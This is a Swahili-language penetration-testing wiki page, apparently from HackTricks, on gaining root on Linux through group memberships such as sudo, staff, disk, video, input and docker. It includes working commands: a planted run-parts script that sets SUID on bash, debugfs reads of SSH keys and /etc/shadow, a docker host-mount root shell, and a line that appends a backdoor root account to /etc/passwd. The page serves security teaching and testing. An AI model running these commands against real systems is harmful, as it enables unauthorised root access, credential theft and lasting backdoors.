# Vikundi Vinavyovutia - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Vikundi vya Sudo/Admin

### **PE - Method 1**

**Wakati mwingine**, sera ya **/etc/sudoers** ya mfumo (au faili iliyojumuishwa kutoka humo) huwa na maingizo kama vile:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Hii inamaanisha kwamba mtumiaji yeyote anayelingana na mojawapo ya maingizo anaweza kuendesha amri yoyote kama mtumiaji lengwa yeyote kupitia `sudo` (kwa kuzingatia sera iliyobaki).<sup>[[3]](#references)</sup>

Ikiwa ndivyo, **ili kuwa root unaweza kutekeleza tu**:

```
sudo su
```

Ikiwa `sudo -l` inaruhusu matumizi yenye vizuizi ya `adduser` kwa jina la mtumiaji pekee, angalia kama inaunda primary group yenye jina hilohilo ambayo bado haipo. Akaunti mpya katika group hiyo inaweza kupata privileges ikiwa policy inayotumika ya sudoers tayari inaziruhusu kwa `%group`; thibitisha tabia ya kuunda group na sheria ya group kabla ya kuchukulia hili kama njia ya privilege escalation. Kuunda akaunti hubadilisha mfumo, kwa hivyo kagua policy kwanza.

### PE - Method 2

Tafuta binaries zote za suid na uangalie kama kuna binary ya **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Ikiwa **pkexec ni binary ya SUID**, inaweza kutekeleza programu kama mtumiaji mwingine tu pale polkit inapoidhinisha kitendo kilichoombwa; biti ya SUID pekee haihakikishi kupata root. Kagua policy iliyosakinishwa na idhini za session lengwa badala ya kudhani kuwa kuwa mwanachama wa **sudo** au **admin** kunatosha.<sup>[[4]](#references)[[5]](#references)</sup>

Kwa njia tofauti ya [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), thibitisha kwanza kuwa `pkexec` ni faili inayoweza kutekelezwa, inayomilikiwa na **root**, na yenye biti ya **SUID**. Binary iliyosakinishwa bila biti hiyo si njia ya kuinua mamlaka ya ndani ya SUID iliyoelezwa kwenye advisory. Mfuatano wa toleo la upstream ni kidokezo tu: distributions zinaweza [kuingiza marekebisho kwenye package za matoleo ya zamani](https://ubuntu.com/security/CVE-2021-4034), kwa hiyo kagua package ya vendor iliyosakinishwa na mitigations kabla ya kusema kuwa ina vulnerability.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) ni njia tofauti ya polkit: race ya uidhinishaji wa D-Bus, si dosari ya SUID ya `pkexec`. Kagua package ya polkit ya vendor iliyosakinishwa na kama kitendo cha D-Bus chenye mamlaka kinachoweza kufikiwa kinaweza kufanya mabadiliko yenye manufaa; njia ya kuunda akaunti pia inahitaji service inayofaa kama AccountsService, na ufikiaji wa sudo wa group yoyote mpya hutegemea policy ya sudo inayotumika. Toleo la polkit lililoripotiwa au service iliyosakinishwa pekee ni kiashiria tu, hasa pale vendors [wanapoingiza marekebisho](https://access.redhat.com/security/cve/cve-2021-3560). Enumeration tulivu haipaswi kuanzisha race.

Kwenye distributions ambazo bado zinatumia backend ya zamani ya Local Authority, kagua sheria zake za group kwa kutumia:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Majina ya group husika na mipangilio chaguomsingi hutofautiana kulingana na distribution; group inafaa hapa tu ikiwa sera ya ndani inaitaja.<sup>[[5]](#references)</sup>

Ili **kupata root unaweza kutekeleza**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Ukijaribu kutekeleza **pkexec** na ukapata **hitilafu** hii:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

Katika kipindi cha SSH kisicho na authentication agent iliyosajiliwa, `pkexec` inaweza kushindwa na kutoa hitilafu hii hata kama sera ingeruhusu kitendo hicho; polkit inaeleza `pkttyagent` kama text authentication agent kwa vipindi visivyo vya desktop. Tabia halisi hutegemea toleo na usambazaji, kwa hivyo hakiki sera ya eneo lako na usanidi wa agent. Workaround moja iliyoripotiwa kwa matoleo yaliyoathirika ya NixOS hutumia **vipindi 2 tofauti vya SSH**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

ACL inayomnyima akaunti moja ufikiaji wa `su` hudhibiti executable hiyo, si kila njia ya kutekeleza kitendo kinachoruhusiwa kwa msimamizi. Ikiwa credential ya msimamizi imefichuka kwa njia nyingine, kagua kama kitendo tofauti, kama vile kuanzisha system service ya muda kupitia `systemd-run`, kinaruhusiwa na effective polkit policy, ni utambulisho upi unaokubaliwa na authentication agent, na service itakayotokana itatumia utambulisho upi. [Polkit hutofautisha authentication kama mmiliki wa kipindi na kama msimamizi](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), huku [systemd-run ikiweza kuomba system manager ianzishe transient service](https://systemd.io/CONTROL_GROUP_INTERFACE/). Ingizo la history, amri iliyosakinishwa, au faili ya sera inayosomeka peke yake haithibitishi ruhusa au uhalali wa credential; ukaguzi usiofanya mabadiliko haupaswi kuwasilisha credentials au kuanzisha unit.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Kikundi cha Wheel

Wakati mwingine sera ya sudoers inaweza pia kuwa na ingizo hili:

```
%wheel	ALL=(ALL:ALL) ALL
```

Hii inamaanisha kuwa mtumiaji yeyote anayelingana na ingizo anaweza kutekeleza amri yoyote kama mtumiaji lengwa kupitia `sudo` (kwa kuzingatia sehemu nyingine za sera).<sup>[[3]](#references)</sup>

Ikiwa ndivyo, **ili kuwa root, unaweza kutekeleza tu**:

```
sudo su
```

## Kundi la Shadow

Kwenye mifumo ambayo ruhusa zake zinaruhusu, watumiaji walio kwenye kundi la **shadow** wanaweza **kusoma** **/etc/shadow**; thibitisha mode na ACL halisi kwenye lengwa:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Kwa hiyo, soma faili na ujaribu **crack baadhi ya hashes**.

Jambo muhimu kuhusu hali ya kufungwa unapochambua hashes:
- Maingizo yenye `!` au `*` kwa kawaida hayaruhusu kuingia kwa nenosiri kwa njia shirikishi.
- `!hash` humaanisha nenosiri lilifungwa; herufi zilizobaki zinawakilisha sehemu ya nenosiri kabla halijafungwa.
- Sehemu yenye `*` si hash halali ya `crypt(3)` na huzuia kuingia kwa nenosiri la UNIX; usihitimishe kutokana nayo ikiwa nenosiri liliwahi kuwekwa au la.
Hili husaidia katika kuainisha akaunti hata pale kuingia moja kwa moja kumepozuiwa.<sup>[[6]](#references)</sup>

## Kikundi cha Staff

**staff**: Huwaruhusu watumiaji kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji haki za root (kumbuka kwamba programu zinazotekelezeka katika `/usr/local/bin` zimo kwenye kigezo cha PATH cha mtumiaji yeyote, na zinaweza "kubatilisha" programu zinazotekelezeka zenye jina sawa katika `/bin` na `/usr/bin`). Linganisha na kikundi cha "adm", ambacho kinahusiana zaidi na ufuatiliaji/usalama.<sup>[[2]](#references)[[7]](#references)</sup>

Katika usanidi wa Debian ambapo `/usr/local/bin` hutangulia `/usr/bin` katika `PATH` (kama ilivyo kwenye mifano iliyo hapa chini), amri isiyo na njia kamili hutumia kwanza nakala iliyo katika `/usr/local/bin`; thibitisha `PATH` inayotumika kwenye lengo.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ikiwa mchakato wenye haki za juu unatafuta command isiyo na njia kamili kupitia `/usr/local/bin` inayoweza kuandikwa, kubadilisha command hiyo kunaweza kuitekeleza kwa haki za mchakato huo; thibitisha njia halisi na kichochezi kabla ya kujaribu.

Kwenye mifumo ya Ubuntu, `pam_motd` huendesha script zinazoweza kutekelezwa kupitia `run-parts --lsbsysinit` kama root wakati wa kuingia; cron jobs pia zinaweza kutumia `run-parts`, lakini hili hutegemea usambazaji na usanidi.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Unapoingia kupitia SSH upya, `pspy` inaweza kusaidia kuthibitisha kama njia hii inatumika kwenye target; inaweza kufuatilia command lines za michakato bila root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Group

Uanachama katika kundi la **disk** unaweza kutoa ufikiaji wa moja kwa moja kwa vifaa vya block na mara nyingi huwa **karibu na root access**; Debian inaeleza kuwa kwa kiasi kikubwa ni sawa na root, lakini hakikisha ruhusa halisi za kifaa na mpangilio wa hifadhi kwenye target.<sup>[[7]](#references)</sup>

Njia za kawaida za vifaa ni pamoja na `/dev/sd*`, lakini NVMe na mipangilio mingine ya hifadhi hutumia majina tofauti.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` hufanya kazi kwenye filesystems za ext2/ext3/ext4; paths kama `/root` na `/etc/shadow` hapo juu ni files ndani ya filesystem iliyofunguliwa, ilhali argument ya pili ya `dump` ni output path kwenye filesystem asilia.<sup>[[8]](#references)</sup> Kwa mfano, hii hutoa `/tmp/asd1.txt` kutoka kwenye filesystem iliyofunguliwa na kuiweka kwenye `/tmp/asd2.txt` kwenye filesystem asilia:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Chaguo la `-w` hufungua filesystem kwa read-write, na amri ya `write` hunakili faili asili kwenye filesystem iliyofunguliwa. Epuka kuitumia kwenye filesystem hai iliyomountiwa, kwa sababu mabadiliko ya moja kwa moja yanaweza kuharibu filesystem; inapowezekana, tumia image ya offline.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Kundi la Video

Kwa kutumia amri `w` unaweza kujua **nani ameingia kwenye mfumo** na itaonyesha matokeo kama yafuatayo.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Ingizo la **tty1** hutambua koni pepe ya kwanza ya Linux; lenyewe halithibitishi kuwa mtumiaji yupo kimwili kwenye mashine, hasa kwenye kontena au mazingira mengine.<sup>[[21]](#references)</sup>

Kwenye mifumo inayowasilisha kifaa cha framebuffer kinachosomeka, uanachama katika kundi la **video** unaweza kuruhusu ufikiaji wa kifaa hicho. Kiolesura cha Linux framebuffer kinaeleza `/dev/fb0` kama kifaa cha kumbukumbu kinachosomeka ambacho kinaweza kunakiliwa ili kuchukua picha ya skrini; njia ya `/sys/class/graphics/fb0/virtual_size` inapatikana tu pale sifa hiyo ya fbdev sysfs inapokuwepo, kwa hivyo kagua lengwa kwanza.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Ikiwa toleo la **GIMP** lililosakinishwa lina raw-data importer, fungua **`screen.raw`** kwa kutumia importer hiyo; usaidizi na vidhibiti hutofautiana kulingana na toleo na plug-in.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Ili kufungua picha raw unaweza kutumia GIMP, chagua faili ya screen.raw na uchague Raw image data kama aina ya faili](<../../../images/image (463).png>)

Weka Width na Height za picha zilingane na vipimo vya framebuffer; jaribu pixel formats/Image Types zilizopo hadi matokeo yaweze kusomeka.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Kisha badilisha Width na Height ziwe zile zinazotumiwa kwenye skrini, na ujaribu Image Types tofauti (kisha uchague ile inayoonyesha skrini vizuri zaidi)](<../../../images/image (317).png>)

## Kikundi cha Input

Kwenye mifumo inayoruhusu kikundi cha `input` kusoma vifaa vya matukio ya kibodi, mwanachama anaweza kuona mibofyo ghafi ya vitufe kutoka kwenye kifaa hicho. Kwanza kagua hali halisi ya ruhusa na ACL: seat ya ndani inayotumika inaweza kupata ruhusa kupitia ACL ya `uaccess` badala yake, na jina la kikundi pekee halihakikishi ufikiaji.<sup>[[23]](#references)[[24]](#references)</sup>

Tafuta handler ya `eventX` ya kibodi, thibitisha kwamba akaunti ya sasa inaweza kusoma node yake, kisha fuatilia jaribio fupi lililoidhinishwa kwa kutumia `evtest`. **Usitumie** `--grab`: huchukua ufikiaji wa kipekee na inaweza kuzuia programu nyingine kupokea ingizo.<sup>[[25]](#references)[[26]](#references)</sup>

```bash
id -nG
cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
getfacl /dev/input/eventX             # Check effective group/seat ACL access
evtest /dev/input/eventX              # Stop with Ctrl-C after the test
```

`EV_KEY` huripoti misimbo ya vitufe badala ya maandishi yaliyokamilika: thamani `1` ni kubonyeza, `0` ni kuachia, na `2` ni kurudia. Hii inaweza kufichua vitufe vilivyoandikwa katika session nyingine kwa kutumia kibodi hiyo halisi, ikiwemo credentials, lakini yenyewe haimpi mtu ufikiaji wa root. Desktop compositor haiondoi ufikiaji wa raw device node.<sup>[[25]](#references)</sup>

Kwa ukaguzi mpana zaidi wa utambulisho na session, angalia [users and sessions](../user-and-session-triage.md).

## Kikundi cha Root

Uanachama katika kikundi cha **root** haukupi UID ya root, lakini faili zinazoweza kuandikwa na kikundi na zinazomilikiwa na `root` bado zinaweza kuvutia ikiwa huduma au libraries zenye upendeleo huzitumia. Thibitisha permissions halisi za faili na jinsi inavyotumiwa kabla ya kuichukulia kama njia ya privilege escalation.

**Angalia faili ambazo wanachama wa root wanaweza kurekebisha**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Kikundi cha Docker

Kuwa mwanachama wa kikundi cha `docker` kunatoa ufikiaji wa kiwango cha root kwa Docker daemon kwenye usakinishaji wa kawaida wa rootful. Kwa kuwa bind mounts husomeka na kuandikika kwa chaguomsingi, mtumiaji anayeweza kudhibiti daemon hiyo anaweza kuweka `/` ya host kwenye container na kubadilisha faili za host; hivyo, mtumiaji huyo hupata root kwenye host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Uanachama wa kikundi unaweza kutolingana kati ya `/etc/group`, `/etc/gshadow`, na tokeni ya mchakato wa sasa. Ikiwa mtumiaji hayupo kwenye matokeo ya `id -nG` lakini `newgrp docker` inafaulu, angalia kikundi kinachoonyeshwa na `id` kwenye shell mpya na ujaribu kama Docker socket inaweza kuandikika na inatoa huduma kwa daemon ya rootful. Jina la kikundi pekee halithibitishi kuwa mtumiaji ana udhibiti wa host. Weka kikomo cha muda kwa uchunguzi wowote wa kiotomatiki wa `newgrp` ili ombi la nenosiri lisikwamishe uchunguzi.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Mwishowe, ikiwa hupendi mapendekezo yoyote yaliyotangulia, au hayafanyi kazi kwa sababu fulani (kama vile firewall ya Docker API?), unaweza kujaribu **kuendesha privileged container na kutoroka kutoka humo** kama ilivyoelezwa hapa:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Ikiwa una ruhusa za kuandika kwenye Docker socket, soma [**chapisho hili kuhusu jinsi ya kufanya privilege escalation kwa kutumia vibaya Docker socket**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm Group

Kwa kawaida, **wanachama** wa kundi la **`adm`** wana ruhusa ya **kusoma faili za kumbukumbu** zilizo ndani ya _/var/log/_.\
Kwa hiyo, ikiwa umeingilia akaunti ya mtumiaji aliye katika kundi hili, hakikisha **unachunguza kumbukumbu**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Makundi haya yana maana mahususi kulingana na huduma na usambazaji wa Linux. Debian inaeleza `backup` kuwa ya kukabidhiwa kazi za kuhifadhi/kurejesha nakala, `lp` kuwa ya huduma za printa, na `mail` kuwa ya `/var/mail`; kwa hiyo, kagua ruhusa za ndani kabla ya kuchukulia uanachama kuwa njia ya kupata mamlaka.<sup>[[7]](#references)</sup>

Mara nyingi huwa njia za **kugundua vitambulisho** badala ya njia za moja kwa moja za kupata root:
- **backup**: inaweza kufichua nakala za hifadhi zilizo na mipangilio, funguo, DB dumps au tokeni.
- **operator**: ufikiaji wa uendeshaji maalum wa jukwaa unaoweza kuvuja data nyeti ya wakati wa utekelezaji.
- **lp**: foleni/spool za uchapishaji zinaweza kuwa na maudhui ya nyaraka.
- **mail**: spool za barua zinaweza kufichua viungo vya kuweka upya, OTP na vitambulisho vya ndani.

Chukulia uanachama katika makundi haya kama ugunduzi wenye thamani kubwa wa kufichuka kwa data, kisha endelea kwa kutumia tena nywila/tokeni.

## Auth group

Kwenye OpenBSD, S/Key inapowekwa, `/etc/skey` inamilikiwa na `root:auth` na ufikiaji wa rekodi zake unahitaji kundi la `auth`; rekodi za YubiKey huhifadhiwa katika `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Mipangilio hatarishi ya OpenBSD 6.6 iliyowezesha S/Key au YubiKey iliwaruhusu watumiaji wa ndani wenye ruhusa za `auth` kupata root; Qualys inaeleza masharti ya awali na mfuatano wa exploit, na PoC iliyounganishwa inatekeleza hilo.<sup>[[18]](#references)[[19]](#references)</sup>



## References

- [1] [Uthibitishaji wa pkexec/pkttyagent bila kipindi cha GUI (suala la NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Wiki ya Debian](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Kurasa za Mwongozo za Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Mwongozo wa Marejeleo wa polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Mwongozo wa Marejeleo wa polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Mwongozo wa Kulinda Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Ukurasa wa mwongozo wa Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Kifaa cha Frame Buffer — Nyaraka za Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Kurasa za Mwongozo za Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Kurasa za Mwongozo za Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — ufuatiliaji wa michakato ya Linux bila ruhusa maalum](https://github.com/DominicBreuker/pspy)
- [13] [Usalama wa Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Kudhibiti Docker kama mtumiaji asiye root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Kuendesha containers — Nyaraka za Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — Kurasa za mwongozo za OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — Kurasa za mwongozo za OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Udhaifu wa uthibitishaji katika OpenBSD — Ushauri wa Usalama wa Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC ya local exploit](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Vifaa vilivyotengwa vya Linux (toleo la 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Kuingiza na Kuuza Picha — Nyaraka za GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
- [23] [Mwongozo wa ruhusa za kifaa cha beep — Debian Sources](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
- [24] [sd-login — Mwongozo wa systemd](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
- [25] [Misimbo ya matukio ya ingizo — Nyaraka za Linux kernel](https://docs.kernel.org/5.18/input/event-codes.html)
- [26] [evtest(1) — Kurasa za Mwongozo za Debian](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
{{#include ../../../banners/hacktricks-training.md}}
